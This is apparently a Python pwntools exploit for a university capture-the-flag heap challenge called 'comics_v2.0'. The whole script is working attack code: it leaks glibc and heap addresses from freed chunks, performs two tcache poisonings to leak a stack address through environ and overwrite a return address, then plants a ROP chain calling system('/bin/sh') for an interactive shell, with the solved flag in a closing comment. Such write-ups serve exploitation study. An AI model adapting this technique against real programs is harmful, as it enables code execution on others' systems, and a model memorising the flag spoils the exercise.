from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./comics_v2.0"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1224
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+210)
#     b *(main+222)      
#     b *(main+234)
#     b *(main+246)                    
#     continue
# ''')

def create_comic(text):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    print(p.recvuntil(b"> ").decode())
    p.send(text)
    log.info(f"Creating a comic with text: {text}")

def print_comic(number):
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"> ").decode())
    p.send(str(number).encode())
    log.info(f"Printing the comic at number: {number}")
    return p.recvuntil(b"====--=======================-----:\n")

def edit_comic(number, text):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(number).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(text)
    log.info(f"Editing the comic at number: {number} with text: {text}")
    print(p.recvuntil(b"> ").decode())

def delete_comic(number):
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    print(p.recvuntil(b"> ").decode())
    p.send(str(number).encode())
    log.info(f"Deleting the comic at number: {number}")

# Stage 1: Leak glibc base address and calculate required glibc addresses
create_comic(b"A"*0x410)
create_comic(b"B"*0x8)
delete_comic(0)
glibc_base_addr = (u64(print_comic(0)[0x12c:0x12c+6].ljust(8, b"\x00"))& ~0xfff) - 0x21a000
log.info(f"Leaking glibc base address: {hex(glibc_base_addr)}")
e = ELF("libc.so.6")
glibc_system_addr = glibc_base_addr + e.symbols.system
glibc_binsh_addr = glibc_base_addr + next(e.search(b"/bin/sh"))
glibc_environ_addr = glibc_base_addr + e.symbols.environ

# Stage 2: Leak heap base address
delete_comic(1)
heap_base_addr = ((u64(print_comic(1)[0x12c:0x12c+5].ljust(8, b"\x00")) << 12) ^ 0) & ~0xfff
log.info(f"Leaking heap base address: {hex(heap_base_addr)}")

# Stage 3: Prepare for the first tcache poisoning
create_comic(b"C"*0x410)
create_comic(b"D"*0x8)
create_comic(b"E"*0x8)
delete_comic(3)
delete_comic(4)

# Stage 4: Perform the first tcache poisoning to leak stack address in environ and calculate return address of create
edit_comic(4, p64(((heap_base_addr + 0x6e0) >> 12) ^ (glibc_environ_addr - 0x10)))
create_comic(b"F"*0x8)
create_comic(b"G"*0x10)
stack_addr_in_environ = u64(print_comic(6)[0x12c+0x10:0x12c+0x10+6].ljust(8, b"\x00"))
log.info(f"Leaking stack address in environ: {hex(stack_addr_in_environ)}")
create_return_addr = stack_addr_in_environ - 0x140

# Stage 5: Prepare for the second tcache poisoning
create_comic(b"H"*0x28)
create_comic(b"I"*0x28)
delete_comic(7)
delete_comic(8)

# Stage 6: Perform the second tcache poisoning
edit_comic(8, p64(((heap_base_addr + 0x730) >> 12) ^ (create_return_addr - 0x8)))
create_comic(b"J"*0x28)

# Stage 7: Form and deploy ROP chain by calling create
r = ROP("libc.so.6")
chain = [
    r.rdi.address + glibc_base_addr,
    glibc_binsh_addr,
    r.ret.address + glibc_base_addr,
    glibc_system_addr
]
create_comic(b"K"*0x8 + b"".join([p64(addr) for addr in chain]))

p.interactive()

# flag{G00DBY3_fr33h00k_h3ll0_n3w_FR13ND_3nv1r0n:)_f8c721699cb3ccf7}
